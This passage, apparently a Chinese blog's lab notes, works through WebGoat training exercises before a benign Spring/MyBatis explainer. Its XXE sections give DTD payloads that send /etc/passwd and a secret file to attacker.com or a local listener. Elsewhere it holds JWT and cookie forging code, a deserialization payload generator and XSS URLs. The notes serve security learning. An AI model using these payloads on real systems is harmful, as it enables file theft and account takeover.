&#x27;webgoat_key&quot;)                .setHeaderParam(&quot;typ&quot;, &quot;JWT&quot;)                .setExpiration(Date.from(Instant.now().plusSeconds(6000)))                .claim(&quot;username&quot;, &quot;Tom&quot;)                .claim(&quot;admin&quot;, &quot;false&quot;)                .signWith(SignatureAlgorithm.HS256, JWT_SECRET)                .compact();    &#125;    public static void main(String[] args) &#123;        String secretToken = getSecretToken();        System.out.println(secretToken);    &#125;&#125;\n\n这里发现脚本中jwt key 都是base64编码的，跟进signWith方法，找实现类能发现里面还是会解码：\n这解释了为什么之前很多jwt key都是base64格式。\n最后更改token发包就行了：\nHSQLDB小知识在注入的过程中，踩了很多坑，后面发现都是由于不清楚HSQLDB的注入性质发生的。\nHSQLDB在select时，必须有一个from操作，不然会报错，这个跟 PostgreSQL &#x2F; MySQL &#x2F; SQLite  不一样。\n一般绕过有：\nselect 1 from (VALUES(0)) \t(VALUES(0))代表临时表，即只有一行，值为0\nselect 1 from  INFORMATION_SCHEMA.SYSTEM_USERS \n这些很多文章都没说，可能默认你会了吧，但是我当时不会，导致花了很多时间。\n密码重置第一题就是让你测试一下webwolf的收邮件功能，没什么。\n第二题让你找出其他用户最喜欢的颜色，这个其实是告诉我们，像这种安全问题有时候可以爆破，因为常见的颜色就那么几种。这里由于可以看源码，一下子就知道了：\n\n第三题这里告诉你为什么安全问题很难设置，列举了许多安全问题和其缺点，任意阅读两个即可。（怪不得现在基本看不见这种验证方式了，确实有很多问题，小时候设置的安全问题现在全忘了）\n第四题这题是修改邮箱中重置密码的链接。先来解释一下原理。\n正常情况下，重置密码的链接是发到自己邮箱里的，比如这一题填webgoat@webgoat.org，就会把邮件发到webwolf对应的邮箱里：\n\n然后点击这里的link就会进入重置密码页面（当然这里不会真的重置你的靶场登录密码）。\n这里的link是：http://localhost:8085/WebGoat/PasswordReset/reset/reset-password/8b53dd29-bdd6-40f4-8a75-196d568d7364\n当我们将重置邮箱填tom@webgoat-cloud.org时，重置邮件会发送给tom，其link应该也是上面这种形式。但是如果攻击者对link里的host可控，就会造成这样的情况，link被修改为：http://www.attacker.com/WebGoat/PasswordReset/reset/reset-password/8b53dd29-bdd6-40f4-8a75-196d568d7364\n那么就会对攻击者的服务器发送一个重置请求。这样一来，受害者tom应该会看到浏览器什么都没打开，但是攻击者却受到了tom的重置link，即：http://www.attacker.com/WebGoat/PasswordReset/reset/reset-password/8b53dd29-bdd6-40f4-8a75-196d568d7364\n这样一来，攻击者只需要修改前面的host为官方地址就可以重置tom的密码了。\n接下来看代码，我们发送重置密码后具体处理逻辑如下：\n我们这里要进入上面那个if，所以需要手动更改host为webwolf的：\n这样进入if后，就会往userToTomResetLink中放入键值对。然后在fakeClickingLinkEmail方法里，会模拟受害者点击邮箱中的密码重置链接。这里的密码重置链接就会被我们的webwolf收到：\n于是我们就能得到tom的密码重置链接，接下来就很简单了。\n一开始没弄懂原理，直接看源码，从成功条件反推的。也是发现这里的密码重置链接并不会用一次就失效，而是可以一直用，不过如果没把Host改成webwolf就是假修改，不会生效。因为下面这个代码：\n必须进入这个if才能真正修改，而这个if对应的checkIfLinkIsFromTom中的userToTomResetLink，只有在前面Host为webwolf的时候才会添加。\n另外，userToTomResetLink始终只存在一个键值对，因为用的是put方法。而resetLinks会随着请求而一直增加，因为用的是add方法。当时迷惑为什么前者每次都会重置，明明两个都是static变量。这也算是模拟真正的重置链接只能用一次。\n安全的密码这里就是告诉你要设置强密码，没什么好说的。\n小结之前对JWT是一知半解，这次学习后算是清楚一点了，主要是做了很多实操，尤其是jku和kid。同时对HSQL的注入也有了初步认识。\n参考https://drun1baby.top/2022/04/07/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-04-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BC%BA%E9%99%B7(%E4%B8%8A)/#5-JWT-Tokens-PageLesson10-Refresh-a-token\n","categories":["代码审计"],"tags":["Java安全","代码审计"]},{"title":"WebGoat靶场-有缺陷的访问控制","url":"/2025/07/26/WebGoat%E9%9D%B6%E5%9C%BA-%E6%9C%89%E7%BC%BA%E9%99%B7%E7%9A%84%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6/","content":"Hijack a session这里考察session伪造。由于开发者的疏忽，session有时候会缺乏随机性，攻击者可通过暴力枚举session的方法来找到一个可用session 。\n来看题目。点击登录按钮并抓包，可以发现返回包中有set-cookie，如果不是第一次登录，可以把请求中的hijack_cookie删除：\n重复发包几次，可以收到不同的cookie，简单观察一下，能够发现cookie有一定规律：\n红框部分都是递增的，前面部分大多数是按1递增，中间有几个缺失。后面部分不规律递增，可能是时间戳什么的。这里其实可以想到爆破。比如前面部分11被跳过了，那11对应的后半部分应该在224398–229782之间。\n现在去看一下代码部分。\n首先是登录部分：\n\n这里逻辑比较简单，有无cookie对应不同的处理逻辑。有的话就直接进行验证，没有的话就生成然后返回。\nAuthentication.builder().id(cookieValue).build()的操作就是装配出一个身份认证实例，里面有id什么的，如下图：\n\n主要看provider.authenticate里面的逻辑：\n\n如果是没携带cookie的情况，会进入isEmpty那个if，给你的身份认证实例先设置一个id。携带cookie的话，就会进入isNotEmpty那个if，来检查你的session是否在服务器的合法列表中。\n不管怎么样，authorizedUserAutoLogin方法都会执行。这个方法的if是随机进入的，进入的话，就会产生一个新的身份认证实例，并将其添加到服务器的合法session列表中。另外，服务器只会存储最近生成的50个合法session，因为addSession中的MAX_SESSIONS是50。\n你也可以直接复制这边的合法session用来直接解题。\nInsecure Direct Object References这几题比较容易，就不写了。\n主要是考察横向越权，就是通过更改请求包中的id字段或是URL中的id字段，来访问或修改其他用户的数据。\nMissing Function Level Access Control这里的翻译是‘缺少功能级访问控制’。但是考察的点似乎都是让你找隐藏信息或者猜测路径的。\n第一题找隐藏的下拉栏，很简单，直接f12就行：\n\n看一下源码：\n\n挺坑的，一定要先写Users，再写Config，而且大小写区分。\n另外，注意这里获取的两个路径：access-control&#x2F;users-admin-fix和access-control&#x2F;config，后面要用。\n第二题让你找Jerry对应的hash。这里应该是想让我们猜测一个路径去请求，返回的结果应该会列出用户信息之类的。结合上面找到的access-control&#x2F;users-admin-fix，我们尝试访问access-control&#x2F;users。\n好吧，感觉根本猜不到，这里我直接看源码：\n\n上面那个路径访问会报错，不知道为什么，好像是模板渲染的问题。\n所以只能访问下面的路径，记得Content-Type改成json，得到hash：\n\n第三题这里也是同样的方法，不过要先发一个POST请求把自己的权限改成admin。\n代码如下：\n\n我们需要访问：access-control&#x2F;users-admin-fix，但是那里会做一个isAdmin判断。所以要先通过下面的POST路由来将我们的用户，我这里是webgoat，添加为admin：\n\n这三个参数可以直接看User类的字段，也可以发送一个空的POST请求，返回包里有。\n这样再去访问access-control&#x2F;users-admin-fix就行了：\n\nSpoofing an Authentication Cookie这里考cookie构造。\n直接看源码，主要看怎么生成cookie的：\n\n具体逻辑在这一行，跟进去：\n\n反转，hex，再base64。解密就是反过来。现在的目标，就是让解密后的结果为tom。SALT的长度是固定的，这样可以写出下面的脚本：\nimport org.springframework.security.crypto.codec.Hex;import java.nio.charset.StandardCharsets;import java.util.Base64;public class tmp &#123;    public static void main(String[] args) &#123;        String name = &quot;tom1111122222&quot;;        name = revert(name);        name = hexEncode(name);        name = base64Encode(name);        System.out.println(name);    &#125;    private static String revert(final String value) &#123;        return new StringBuilder(value).reverse().toString();    &#125;    private static String hexEncode(final String value) &#123;        char[] encoded = Hex.encode(value.getBytes(StandardCharsets.UTF_8));        return new String(encoded);    &#125;    private static String base64Encode(final String value) &#123;        return Base64.getEncoder().encodeToString(value.getBytes());    &#125;&#125;\n\n只要在tom后面任意添加10个字符就行了。带上cookie重新发包：\n\n小结总感觉没学到太多，这些东西以前好像都接触过。但是把靶场过一遍还是花了不少时间，之后遇到简单的，就专注于看代码而不是做题吧。\n然后下面还有一个密码的板块，那个就不写了，主要是讲一些加密方式，自己了解一下就行。\n参考https://drun1baby.top/2022/04/24/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-06-%E6%9C%89%E7%BC%BA%E9%99%B7%E7%9A%84%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6/#0x03-Missing-Function-Level-Access-Control\nhttps://zhuanlan.zhihu.com/p/648214018\n","categories":["代码审计"],"tags":["Java安全","代码审计"]},{"title":"WebGoat靶场-错误的安全配置","url":"/2025/07/28/WebGoat%E9%9D%B6%E5%9C%BA-%E9%94%99%E8%AF%AF%E7%9A%84%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/","content":"前言这里包括两个内容：xxe和csrf。\n为什么归类在错误的安全配置里，我觉得是这两个漏洞的修复主要依靠各种配置，不太涉及到大量的代码修改，修复过程不容易对业务产生影响。\n刚接触网安的时候，学的是ctf。由于ctf里没遇到过太多xxe和csrf的题目，所以这一块知识一直很薄弱，借此机会巩固一下。\nxxe基础复习又去问了AI，发现了以前没注意的一些点。\n1、DTD中，通用实体不能直接引用参数实体\n&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#x27;http://attacker.com/?data=%file;&#x27;&gt;&quot;&gt;%all;\n\n上面的例子中，% all 这种带百分号的，就是参数实体，只能在DTD中使用。\n一开始我在想，为什么不直接写 ，而是要用 %all 套一层。后面才知道通用实体直接引用参数实体会报错。\n最后的poc：\n&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE data [    &lt;!ENTITY % a SYSTEM &quot;http://attacker.com/evil.dtd&quot;&gt;%a;]&gt;&lt;data&gt;&amp;send;&lt;/data&gt;\n\n\n\n第一题很简单，直接通过file协议读文件就行。记得注入的实体要写在text标签内，这样才能回显在评论区，才满足题目要求。同时注意一下windows下调用file协议读文件的格式，file:&#x2F;&#x2F;&#x2F;C:&#x2F;\n\n源码部分，重点在org.owasp.webgoat.lessons.xxe.CommentsCache#parseXml：\n\n这里调用xml解析时，securityEnabled默认是false的，所以运行外部实体和DTD。想要修复漏洞也很简单，把这些配置打开即可。由于业务中一般不会用到外部实体，所以对正常业务没有影响。\n第二题就是抓包手动将Content-Type改成application&#x2F;xml。payload和上面一致。\n源码部分就是根据Content-Type进入不同方法，没什么好说的\n\n第三题无回显的xxe。\n先看exp：\ndtd文件：\n&lt;!ENTITY % file SYSTEM &quot;file:///C:/Users/snowstorm-maxy/.webgoat-2025.3/XXE/webgoat/secret.txt&quot;&gt;&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#x27;http://127.0.0.1:7778/%file;&#x27;&gt;&quot;&gt;%all;\n\n数据包：\n&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE com [&lt;!ENTITY % dtd SYSTEM &quot;http://127.0.0.1:7778/evil.dtd&quot;&gt;%dtd;]&gt;&lt;comment&gt;  &lt;text&gt;3213 &amp;send;&lt;/text&gt;&lt;/comment&gt;\n\n收到请求，记得url解码：\n\n下面介绍几种常见的错误写法：\n1、直接引用参数实体\n&lt;!DOCTYPE com [&lt;!ENTITY % test &quot;aaaa&quot;&gt;&lt;!ENTITY % a &quot;%test;&quot;&gt;]&gt;和&lt;!DOCTYPE com [&lt;!ENTITY % test &quot;aaaa&quot;&gt;&lt;!ENTITY a &quot;%test;&quot;&gt;]&gt;\n\n这两种写法都会报错：参数实体引用 “%test;” 不能出现在 DTD 的内部子集中的标记内\n所以不能直接创建一个%file，然后在下面的send 中直接引用\n2、不远程加载dtd，直接写到数据包中\n我一开始想，为什么不直接写到请求体里，效果不是一样吗，就像这样：\n&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE com [&lt;!ENTITY % file SYSTEM &quot;file:///C:/Users/snowstorm-maxy/.webgoat-2025.3/XXE/webgoat/secret.txt&quot;&gt;&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#x27;http://127.0.0.1:7778/%file;&#x27;&gt;&quot;&gt;%all;]&gt;&lt;comment&gt;  &lt;text&gt;3213 &amp;send;&lt;/text&gt;&lt;/comment&gt;\n\n然而，这里的报错和上面的是一样的。\n上面问题的原因都是一样的，就是xml1.0不允许这种语法，即不允许內部子集(没有用SYSTEM的)引用参数实体。但是通过dtd加载可以绕过这种限制。\n3、%file引用未生效\n&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE com [&lt;!ENTITY % file SYSTEM &quot;file:///C:/Users/snowstorm-maxy/.webgoat-2025.3/XXE/webgoat/secret.txt&quot;&gt;&lt;!ENTITY % all SYSTEM &#x27;http://127.0.0.1:7778/%file;&#x27;&gt;%all;]&gt;&lt;comment&gt;  &lt;text&gt;3213 &amp;send;&lt;/text&gt;&lt;/comment&gt;\n\n这种情况，%file不会解析\n\n总之，很多情况下我们都需要依赖dtd去远程加载，然后再到主文档里展开。\ncsrf第一题让你从非同源的host点击按钮，这里可以用到bp自带的工具：\n\n这样可以直接生成一个表单，然后从非同源位置提交：\n源码方法，这里主要是根据referer和host的关系来判断：\n\n第二题基本一样，但是这里多了一个weakAntiCSRF，相当于一个token吧，但是这个token是固定的，所以没有起到防护作用。\n\n第三题这里主要考查的是 怎么通过表单提交json格式的数据。\n我们跟之前一样，直接用bp自带的工具产生的表单在提交时会出现一个问题，即数据最后会有一个等号，导致报错：\n\n这是由于我们提交的是一个表单，表单肯定时param&#x3D;value这样的形式，但是我们的value实际为空：\n\n因此会产生这个问题。要做的就是改变value的值，使json闭合。可以这样设置：\n\n这样就行了：\n\n源码没什么可讲的，就是按之前的逻辑判断，再加一个对Content-Type的判断。\n第四题模拟受害者无意中登录攻击者的账号，攻击者从而可以记录受害者在此账号上的活动记录。\n去另外注册一个csrf-xxxx，xxx是你的用户名，然后点击题目对应的按钮就行。\n小结这里先简单过一遍，详细的后面遇到具体问题再补充\n参考https://drun1baby.top/2022/04/18/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-05-XXE%E6%B3%A8%E5%85%A5/\n","categories":["代码审计"],"tags":["Java安全","代码审计"]},{"title":"WebGoat靶场-SSRF&反序列化","url":"/2025/07/28/WebGoat%E9%9D%B6%E5%9C%BA-SSRF/","content":"前言这里考的异常简单，连常见的绕过手法和协议都没讲，感觉设计的不太完善。之后会再单独出一篇来学Java的SSRF。这里为了完整性，还是写一下。\nSSRF第一题&amp;第二题第一题读内部数据，第二题向外发请求，基本一样。\n\n直接改url这里的就行。第二题整个替换掉就行。\n源码部分，这两题用的都是单纯的字符串匹配，实际上就不是真正的ssrf：\n\n反序列化这里要注意用webgoat给你提供的反序列化类org.dummy.insecure.framework.VulnerableTaskHolder\n然后windows下是没有sleep命令的，所以我这里用ping，ping 127.0.0.1就行，也能满足延迟3s–7s\npackage org.owasp.webgoat.lessons.deserialization.tmp;import com.fasterxml.jackson.databind.node.POJONode;import org.dummy.insecure.framework.VulnerableTaskHolder;import java.io.ByteArrayOutputStream;import java.io.IOException;import java.io.ObjectOutputStream;import java.util.Base64;public class sleep &#123;    public static byte[] ser(Object obj) throws IOException &#123;        ByteArrayOutputStream baos = new ByteArrayOutputStream();        ObjectOutputStream oos = new ObjectOutputStream(baos);        oos.writeObject(obj);        oos.close();        return baos.toByteArray();    &#125;    public static void main(String[] args) throws IOException &#123;        VulnerableTaskHolder vul = new VulnerableTaskHolder(&quot;webgoat&quot;, &quot;ping 127.0.0.1&quot;);        byte[] ser = ser(vul);        String s = Base64.getEncoder().encodeToString(ser);        System.out.println(s);    &#125;&#125;\n\n另外2025版本的靶场用的是jdk23，Templates的Sink链都用不了了。\n","categories":["代码审计"],"tags":["Java安全","代码审计"]},{"title":"WebGoat靶场-XSS","url":"/2025/08/02/WebGoat%E9%9D%B6%E5%9C%BA-XSS/","content":"反射型&amp;DOM第一题没什么好说的，点一下按钮就行，只是让你初步认识一下控制台及script脚本的作用。\n第二题就最下面倒数第二个框可以注入，然后注入方式只有两种，alert和console.log，从源码可以看出来：\n\n注入方法是写死的，必须满足题目设置。\n第三题这里考察DOM型XSS。\n首先看一下webgoat靶场中URL的特点\nhttp://localhost:8085/WebGoat/start.mvc#lesson/CrossSiteScripting.lesson/9\n发现由#分割为两个部分。#后面的内容，是由前端处理的，也就是由script进行页面的切换。\n下面的内容涉及到js，我不太会，先贴别人的贴子了：\nhttps://drun1baby.top/2022/05/05/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-07-XSS/#2-XSS-PageLesson10-DOM-%E5%9E%8B-XSS-%E5%88%A9%E7%94%A8%E6%B5%8B%E8%AF%95%E7%9A%84%E4%BB%A3%E7%A0%81%E8%BF%9B%E8%A1%8C-XSS-%E6%94%BB%E5%87%BB\n简单来说就是找script文件中参数可控，且能触发xss的地方。\n最终结果是：start.mvc#test\n咱们可以通过这种路由去触发：http://localhost:8085/WebGoat/start.mvc#test/%3Cscript%3Ealert%281%29%3C%2fscript%3E\nDOM型其实和反射型很像。\n两种的区别在于：\n\nDOM型是直接由前端处理注入的参数，整个过程不会向后端传递数据\n反射型是将数据传到后端过了一遍，再回显到前端页面实现注入的\n\n第四题用到上面那个#test，然后到f12 控制台检查。\nhttp://localhost:8085/WebGoat/start.mvc#test/%3Cscript%3Ewebgoat%2ecustomjs%2ephoneHome%28123%29%3C%2fscript%3E\n\n存储型直接往评论区发，跟上面调用的script是一样的。只不过这里只要有用户浏览评论区就会触发。\n小结这里显然只能学到最基础的，后面遇到具体漏洞的时候再补充吧\n参考https://drun1baby.top/2022/05/05/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-07-XSS/\n","categories":["代码审计"],"tags":["Java安全","代码审计"]},{"title":"开发框架简述","url":"/2025/07/28/%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%E7%AE%80%E8%BF%B0/","content":"前言在看代码的过程中，经常会对项目的框架产生很多问题，比如不知道每个配置文件是干什么的。同时，也经常忘记一些名词的含义，比如Mapper，SSM是什么。所以这里来整理一下，方便未来忘记时查阅，同时也可以将新知识不断补充。\nSSM框架ssm指：Spring MVC + Spring + Mybatis，而Spring MVC &#x3D; Model + View + Controller\n先来看一下一个SSM例子的总体结构：\n\n在Java源码包中，是很经典的三层结构：Controller+Service+DAO\nresources包中，是各种组件的配置文件，包括spring的，mybatis的\nspring配置文件这里写成好几个了，但是只是为了更职责分明，其实是可以直接全写到applicationContext里的。\nWEB-INF包中，存有web.xml文件，这个很重要，里面包括了DispatcherServlet的声明，调用的过滤器，以及路由映射（不用注解时才有）。\n这里有一点需要注意，mybatis相关的mapper.xml一般也放在resources里\n各层职责1、控制层（Controller）–Spring MVC主要负责处理来自用户的HTTP请求，然后交给业务层处理。SpringMVC会根据URL映射将请求路由对应到相应的Controller方法。\n2、业务层（Service）–Spring通常负责处理具体的业务逻辑，一般会调用DAO层进行数据库操作。业务层与控制层是松耦合的，即控制层只调用业务层接口，而不是具体实现类。什么是松耦合后面会讲。\n3、数据访问层（DAO）–MybatisMybatis有两种方法实现SQL查询与Java方法相映射。（注意，这里是绑定Java方法，还有一种常用的数据查询方式是ORM，即直接将数据映射到对象，通过操作对象来实现SQL查询。）\n一种是通过xml文件，另一种是通过注解\nxml法：\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE mapper        PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;        &quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;&lt;mapper namespace=&quot;com.ssm_project.dao.BookMapper&quot;&gt;    &lt;!--根据id查询,返回一个Book--&gt;    &lt;select id=&quot;queryBookById&quot; resultType=&quot;Books&quot;&gt;        select * from ssmbuild.books        where bookID = #&#123;bookID&#125;    &lt;/select&gt;&lt;/mapper&gt;package com.ssm_project.dao;import com.ssm_project.pojo.Books;import java.util.List;public interface BookMapper &#123;    //根据id查询,返回一个Book    Books queryBookById(String id);&#125;\n\n注解法：\n@Mapperpublic interface StudentDAO &#123;    @Select(&quot;SELECT * FROM students&quot;)    List&lt;Student&gt; getAllStudents();    @Insert(&quot;INSERT INTO students(name, age) VALUES(#&#123;name&#125;, #&#123;age&#125;)&quot;)    void addStudent(Student student);&#125;\n\n4、模型层（Model）这里就是常说的POJO，一般用来定义各种类，类字段对应数据库中的表字段\n5、视图层（View）–SpringMVC+JSP用于展示数据，在传统SSM中一般用JSP。\n这里有一个Controller返回一个Model视图：\n@RequestMapping(&quot;/allBook&quot;)public ModelAndView list(Model model) &#123;    List&lt;Books&gt; list = bookService.queryAllBook();   ModelAndView modelAndView = new ModelAndView();   modelAndView.addObject(&quot;list&quot;,list);   modelAndView.setViewName(&quot;allbooks&quot;);   return modelAndView;&#125;\n\n在这里就会对应allbooks.jsp\n&lt;tbody&gt;&lt;c:forEach var=&quot;book&quot; items=&quot;$&#123;requestScope.get(&#x27;list&#x27;)&#125;&quot;&gt;    &lt;tr&gt;        &lt;td&gt;$&#123;book.getBookID()&#125;&lt;/td&gt;        &lt;td&gt;$&#123;book.getBookName()&#125;&lt;/td&gt;        &lt;td&gt;$&#123;book.getBookCounts()&#125;&lt;/td&gt;        &lt;td&gt;$&#123;book.getDetail()&#125;&lt;/td&gt;        &lt;td&gt;            &lt;a href=&quot;toUpdateBook?id=$&#123;book.getBookID()&#125;&quot;&gt;更改&lt;/a&gt; |            &lt;a href=&quot;del/$&#123;book.getBookID()&#125;&quot;&gt;删除&lt;/a&gt;        &lt;/td&gt;    &lt;/tr&gt;&lt;/c:forEach&gt;&lt;/tbody&gt;\n\n为什么能对应到allbooks.jsp，这里要依赖spring配置文件：\n&lt;!-- 3.配置jsp 显示ViewResolver视图解析器 --&gt;&lt;bean class=&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;&gt;    &lt;property name=&quot;viewClass&quot; value=&quot;org.springframework.web.servlet.view.JstlView&quot; /&gt;    &lt;property name=&quot;prefix&quot; value=&quot;/WEB-INF/view/&quot; /&gt;    &lt;property name=&quot;suffix&quot; value=&quot;.jsp&quot; /&gt;&lt;/bean&gt;\n\n松耦合的解释Controller层是直接调用Service接口，而不是具体实现类，那么它怎么知道要使用哪个实现类？\n这里用到了Spring的依赖注入机制，它能够通过@Autowire注解来自动将具体实现类赋值给接口。当实现类唯一时，用@Autowire就够了，不然还需要使用@Qualifier(“BookServiceImpl”)来指定具体实现类。\n@Autowired@Qualifier(&quot;BookServiceImpl&quot;)private BookService bookService;\n\n配置文件简介Spring配置文件1、命名空间和xml文件声明\n这里告诉spring容器能够在配置文件里使用哪些标签，以及如何解析配置文件\n&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans \n\n第一行允许你通过bean标签定义bean\n2、组件扫描\n&lt;context:component-scan base-package=&quot;com.ssm_project.controller&quot; /&gt;\n\n这里会自动扫描包下带有@Controller等注解的类并自动注册为bean，这样就不需要手动通过bean标签配置了。这也是为什么可以直接通过@Autowired进行自动注入，因为相应的Service实现类已经被自动注册为Bean了。\n3、数据源配置\n这个对应上面实例项目中的spring-dao\n    &lt;!-- 1.关联数据库文件 --&gt;    &lt;context:property-placeholder location=&quot;classpath:database.properties&quot;/&gt;    &lt;!-- 2.数据库连接池 --&gt;    &lt;!--数据库连接池dbcp  半自动化操作  不能自动连接c3p0  自动化操作（自动的加载配置文件 并且设置到对象里面）    --&gt;    &lt;bean id=&quot;dataSource&quot; class=&quot;com.mchange.v2.c3p0.ComboPooledDataSource&quot;&gt;        &lt;!-- 配置连接池属性 --&gt;        &lt;property name=&quot;driverClass&quot; value=&quot;$&#123;jdbc.driver&#125;&quot;/&gt;        &lt;property name=&quot;jdbcUrl&quot; value=&quot;$&#123;jdbc.url&#125;&quot;/&gt;        &lt;property name=&quot;user&quot; value=&quot;$&#123;jdbc.username&#125;&quot;/&gt;        &lt;property name=&quot;password&quot; value=&quot;$&#123;jdbc.password&#125;&quot;/&gt;        &lt;!-- c3p0连接池的私有属性 --&gt;        &lt;property name=&quot;maxPoolSize&quot; value=&quot;30&quot;/&gt;        &lt;property name=&quot;minPoolSize&quot; value=&quot;10&quot;/&gt;        &lt;!-- 关闭连接后不自动commit --&gt;        &lt;property name=&quot;autoCommitOnClose&quot; value=&quot;false&quot;/&gt;        &lt;!-- 获取连接超时时间 --&gt;        &lt;property name=&quot;checkoutTimeout&quot; value=&quot;10000&quot;/&gt;        &lt;!-- 当获取连接失败重试次数 --&gt;        &lt;property name=&quot;acquireRetryAttempts&quot; value=&quot;2&quot;/&gt;    &lt;/bean&gt;\n\nSpring会用这个数据源来管理数据库连接，同时注入到需要数据库连接的Bean中。\n4、MyBatis配置\n&lt;bean id=&quot;sqlSessionFactory&quot; class=&quot;org.mybatis.spring.SqlSessionFactoryBean&quot;&gt;    &lt;property name=&quot;dataSource&quot; ref=&quot;dataSource&quot; /&gt;    &lt;property name=&quot;configLocation&quot; value=&quot;classpath:mybatis-config.xml&quot; /&gt;&lt;/bean&gt;\n\n这部分主要是指向上面的数据源配置，并导入mybatis的全局配置。\n&lt;!-- 4.配置扫描Dao接口包，动态实现Dao接口注入到spring容器中 --&gt;&lt;!--解释 ： https://www.cnblogs.com/jpfss/p/7799806.html--&gt;&lt;bean class=&quot;org.mybatis.spring.mapper.MapperScannerConfigurer&quot;&gt;    &lt;!-- 注入sqlSessionFactory --&gt;    &lt;property name=&quot;sqlSessionFactoryBeanName&quot; value=&quot;sqlSessionFactory&quot;/&gt;    &lt;!-- 给出需要扫描Dao接口包 --&gt;    &lt;property name=&quot;basePackage&quot; value=&quot;com.ssm_project.dao&quot;/&gt;&lt;/bean&gt;\n\n这部分用于扫描Mapper接口。Mapper接口中的方法都会与SQL查询关联，这是mybatis的特点。\nweb.xml1、DispatcherServlet\n&lt;!--DispatcherServlet--&gt;&lt;servlet&gt;  &lt;servlet-name&gt;DispatcherServlet&lt;/servlet-name&gt;  &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt;  &lt;init-param&gt;    &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;    &lt;param-value&gt;classpath:applicationContext.xml&lt;/param-value&gt;  &lt;/init-param&gt;  &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;&lt;/servlet&gt;&lt;servlet-mapping&gt;  &lt;servlet-name&gt;DispatcherServlet&lt;/servlet-name&gt;  &lt;url-pattern&gt;/&lt;/url-pattern&gt;&lt;/servlet-mapping&gt;\n\nDispatcherServlet是SpringMVC的核心组件，负责处理所有的HTTP请求，会根据请求调用Controller，并负责视图解析。\n下面的URL映射代表将哪些请求交给SpringMVC处理。\n2、filter\n  &lt;filter&gt;    &lt;filter-name&gt;XSSEscape&lt;/filter-name&gt;    &lt;filter-class&gt;com.ssm_project.filter.XssFilter&lt;/filter-class&gt;  &lt;/filter&gt;  &lt;filter-mapping&gt;    &lt;filter-name&gt;XSSEscape&lt;/filter-name&gt;    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;&lt;!--    &lt;dispatcher&gt;REQUEST&lt;/dispatcher&gt;--&gt;  &lt;/filter-mapping&gt;\n\n这个跟Servlet里的filter一样。\nMyBatis配置首先要指定三件东西：Mapper接口，Mapper接口对应的xml，mybatis总配置的xml\nMapper接口：\npackage com.ssm_project.dao;import com.ssm_project.pojo.Books;import java.util.List;public interface BookMapper &#123;    //根据id查询,返回一个Book    Books queryBookById(String id);&#125;\n\nMapper接口对应的xml：\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE mapper        PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;        &quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;&lt;mapper namespace=&quot;com.ssm_project.dao.BookMapper&quot;&gt;    &lt;!--根据id查询,返回一个Book--&gt;    &lt;select id=&quot;queryBookById&quot; resultType=&quot;Books&quot;&gt;        select * from ssmbuild.books        where bookID = #&#123;bookID&#125;    &lt;/select&gt;&lt;/mapper&gt;\n\nmybatis总配置文件：\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE configuration        PUBLIC &quot;-//mybatis.org//DTD Config 3.0//EN&quot;        &quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;&gt;&lt;configuration&gt;    &lt;settings&gt;        &lt;setting name=&quot;logImpl&quot; value=&quot;STDOUT_LOGGING&quot; /&gt;    &lt;/settings&gt;    &lt;typeAliases&gt;        &lt;package name=&quot;com.ssm_project.pojo&quot;/&gt;    &lt;/typeAliases&gt;    &lt;mappers&gt;        &lt;mapper resource=&quot;com/ssm_project/dao/BookMapper.xml&quot;/&gt;    &lt;/mappers&gt;&lt;/configuration&gt;\n\n最主要的就是要把BookMapper.xml注册到总配置里，当然也可以直接扫描包\n&lt;package name=&quot;com.example.mapper&quot; 